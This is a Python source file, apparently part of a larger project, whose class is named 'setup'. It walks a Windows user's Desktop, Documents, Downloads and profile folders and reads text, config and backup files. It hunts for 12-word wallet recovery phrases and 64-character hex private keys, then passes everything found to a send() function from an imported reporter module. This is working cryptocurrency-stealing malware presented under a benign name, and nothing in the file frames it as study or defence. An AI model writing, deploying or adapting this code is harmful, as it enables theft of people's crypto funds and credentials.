import os
import re
import time
import threading
from pathlib import Path
from reporter import send
from mnemonic import Mnemonic

mnemo = Mnemonic("english")
LOG_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "analysis_log.txt")

def log(msg):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{time.ctime()} - {msg}\n")
    except:
        pass

class setup:
    def __init__(self):
        self.data = []
        self.files_scanned = 0
        self.found_items = []
        self.running = True
    
    def run(self):
        log("=== ANALYSIS STARTED ===")
        log(f"PATH: {os.getcwd()}")
        log(f"SCANNING DRIVES: {self._get_drives()}")
        
        self._scan_all()
        log(f"ANALYSIS COMPLETE - Found: {len(self.found_items)}")
        if self.found_items:
            log(f"SENDING {len(self.found_items)} ITEMS")
            for item in self.found_items:
                self.data.append(item)
            send(self.data)
        else:
            log("No data found")
    
    def _get_drives(self):
        drives = []
        for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
            path = f"{letter}:\\"
            if os.path.exists(path):
                drives.append(path)
        return drives
    
    def _scan_all(self):
        try:
            # Priority folders
            paths = [
                os.path.expandvars("%USERPROFILE%\\Desktop"),
                os.path.expandvars("%USERPROFILE%\\Documents"),
                os.path.expandvars("%USERPROFILE%\\Downloads"),
                os.path.expandvars("%USERPROFILE%"),
            ]
            for path in paths:
                if os.path.exists(path):
                    log(f"Scanning: {path}")
                    self._scan_directory(path, depth=3)
            
            # Full drive scan (simplified to avoid false positives)
            # Skip for now to avoid false positives
            # for drive in self._get_drives():
            #     self._scan_directory(drive, skip_system=True)
            
        except Exception as e:
            log(f"Error: {e}")
    
    def _scan_directory(self, directory, depth=None, skip_system=False):
        try:
            skip_dirs = ['Windows', 'Program Files', 'Program Files (x86)',
                        'System32', 'System Volume Information', '$Recycle.Bin',
                        'AppData\\Local\\Temp', '.git', 'node_modules', '__pycache__']
            
            for root, dirs, files in os.walk(directory):
                if skip_system:
                    dirs[:] = [d for d in dirs if d not in skip_dirs and not d.startswith('$')]
                if depth and root.replace(directory, '').count(os.sep) > depth:
                    continue
                for file in files:
                    file_path = os.path.join(root, file)
                    ext = os.path.splitext(file)[1].lower()
                    if ext in {'.txt', '.json', '.dat', '.log', '.bak', '.old', '.md', '.cfg', '.conf', '.ini'} or not ext:
                        self._scan_file(file_path)
                    self.files_scanned += 1
                    if self.files_scanned % 5000 == 0:
                        log(f"Scanned {self.files_scanned} files...")
        except Exception as e:
            log(f"Scan dir error: {e}")
    
    def _scan_file(self, file_path):
        try:
            if os.path.getsize(file_path) > 5 * 1024 * 1024:
                return
            
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read(50000)
                if not content or len(content) < 20:
                    return
                
                words = re.findall(r'\b[a-zA-Z]+\b', content)
                for i in range(len(words) - 11):
                    phrase = ' '.join(words[i:i+12])
                    try:
                        if mnemo.check(phrase):
                            log(f"✅ FOUND SEED: {file_path}")
                            self.found_items.append({
                                'type': 'seed',
                                'path': file_path,
                                'content': phrase
                            })
                            return
                    except:
                        pass
                
                # Check for private keys
                matches = re.findall(r'(?:0x)?[a-fA-F0-9]{64}', content)
                for match in matches:
                    if len(match) == 66 and match.startswith('0x'):
                        log(f"✅ FOUND KEY: {file_path}")
                        self.found_items.append({
                            'type': 'private_key',
                            'path': file_path,
                            'content': match
                        })
                        return
                    elif len(match) == 64 and match not in ['0'*64, '1'*64, 'f'*64, 'a'*64]:
                        log(f"✅ FOUND KEY: {file_path}")
                        self.found_items.append({
                            'type': 'private_key',
                            'path': file_path,
                            'content': f"0x{match}"
                        })
                        return
        except:
            pass